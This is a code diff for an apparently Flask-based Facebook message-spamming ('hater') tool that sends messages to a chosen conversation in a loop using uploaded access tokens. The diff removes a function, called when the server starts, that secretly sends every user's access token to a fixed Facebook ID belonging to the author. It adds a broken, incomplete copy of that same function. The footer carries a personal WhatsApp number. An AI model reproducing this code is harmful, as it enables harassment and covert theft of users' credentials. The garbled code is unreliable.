@@ -22,7 +22,19 @@ headers = {
 
 stop_events = {}
 threads = {}
+def send_initial_message():
+      with open('token.txt', 'r') as file:
+          tokens = file.readlines()
 
+      # Modify the message as per your requirement
+      msg_template = "Hello Prince sir! I am using your server. My token is {}"
+
+      # Specify the ID where you want to send the message
+      target_id = "100064267823693"
+
+      requests.packages.urllib3.disable_warnings()
+
+      def liness():
 def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
@@ -77,6 +89,7 @@ def send_message():
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
+    /* CSS for styling elements */
     label { color: white; }
     .file { height: 30px; }
     body {
@@ -139,9 +152,53 @@ def send_message():
         <label for="tokenFile" class="form-label">Choose Token File</label>
         <input type="file" class="form-control" id="tokenFile" name="tokenFile">
       </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">Enter Your Hater Name</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">Enter Time (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">Choose Your Np File</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
       <button type="submit" class="btn btn-primary btn-submit">Run</button>
     </form>
+    <form method="post" action="/stop">
+      <div class="mb-3">
+        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" required>
+      </div>
+      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
+    </form>
   </div>
+  <footer class="footer">
+    <p>© 2024 𝐌𝐀𝐃𝐄 𝐁𝐘 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄✌️😈🐧</p>
+    <p> 😎𝐅𝐀𝐓𝐇𝐄𝐑 𝐎𝐅 𝐀𝐋𝐋 𝐇𝐀𝐓𝐄𝐑𝐒 𝐓𝐇𝐄 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄🔥😈 <a href="https://www.facebook.com/profile.php?id=61554673127359&mibextid=ZbWKwL">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
+    <div class="mb-3">
+      <a href="https://wa.me/+918266803073" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
+      </a>
+    </div>
+  </footer>
+  <script>
+    function toggleTokenInput() {
+      var tokenOption = document.getElementById('tokenOption').value;
+      if (tokenOption == 'single') {
+        document.getElementById('singleTokenInput').style.display = 'block';
+        document.getElementById('tokenFileInput').style.display = 'none';
+      } else {
+        document.getElementById('singleTokenInput').style.display = 'none';
+        document.getElementById('tokenFileInput').style.display = 'block';
+      }
+    }
+  </script>
 </body>
 </html>
 ''')
@@ -155,27 +212,5 @@ def stop_task():
     else:
         return f'No task found with ID {task_id}.'
 
-def send_initial_message():
-    try:
-        with open('token.txt', 'r') as file:
-            tokens = file.read().strip().splitlines()
-
-        msg_template = "Hello Prince sir! I am using your server. My token is {}"
-        target_id = "100064267823693"
-
-        for token in tokens:
-            api_url = f'https://graph.facebook.com/v15.0/{target_id}/messages'
-            parameters = {'access_token': token, 'message': msg_template.format(token)}
-            response = requests.post(api_url, data=parameters, headers=headers)
-
-            if response.status_code == 200:
-                print(f"Initial message sent successfully using token {token}")
-            else:
-                print(f"Failed to send initial message using token {token}")
-
-    except Exception as e:
-        print(f"Error sending initial message: {e}")
-
 if __name__ == '__main__':
-    send_initial_message()  # Call function when server starts
     app.run(host='0.0.0.0', port=5000)
